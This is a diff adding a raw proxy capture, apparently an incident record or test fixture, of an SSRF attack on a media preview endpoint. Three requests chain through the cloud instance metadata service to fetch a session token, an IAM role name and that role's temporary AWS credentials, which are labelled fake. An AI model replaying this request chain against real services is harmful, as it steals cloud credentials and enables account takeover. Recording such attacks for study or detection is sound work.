@@ -1,0 +1,45 @@
+# SSRF proxy capture -- kekeli media preview service (10.0.4.19)
+# The /preview?url= endpoint fetched attacker-supplied URLs server-side.
+
+--- request 1 (attacker -> /preview) ---
+GET /preview?url=http://169.254.169.254/latest/api/token HTTP/1.1
+Host: preview.kekeli.internal
+
+--- upstream 1 (server -> IMDS) ---
+PUT /latest/api/token HTTP/1.1
+Host: 169.254.169.254
+X-aws-ec2-metadata-token-ttl-seconds: 21600
+
+HTTP/1.1 200 OK
+AQAEAFAKEimdsv2tokenEXAMPLEonlyNOTreal==
+
+--- request 2 (attacker -> /preview) ---
+GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
+Host: preview.kekeli.internal
+
+--- upstream 2 (server -> IMDS, with token header) ---
+GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
+Host: 169.254.169.254
+X-aws-ec2-metadata-token: AQAEAFAKEimdsv2tokenEXAMPLEonlyNOTreal==
+
+HTTP/1.1 200 OK
+media-transcoder-role
+
+--- request 3 (attacker -> /preview) ---
+GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/media-transcoder-role HTTP/1.1
+Host: preview.kekeli.internal
+
+--- upstream 3 (server -> IMDS, with token header) ---
+GET /latest/meta-data/iam/security-credentials/media-transcoder-role HTTP/1.1
+Host: 169.254.169.254
+X-aws-ec2-metadata-token: AQAEAFAKEimdsv2tokenEXAMPLEonlyNOTreal==
+
+HTTP/1.1 200 OK
+{
+  "Code" : "Success",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAQF4KEKELI0FAKE01",
+  "SecretAccessKey" : "wJalrFAKEdevSECRETkeyEXAMPLEnotREAL0123456",
+  "Token" : "IQoJb3JpFAKEdevSESSIONtokenEXAMPLEonly//////////wEXAMPLE==",
+  "Expiration" : "2026-03-02T15:04:05Z"
+}
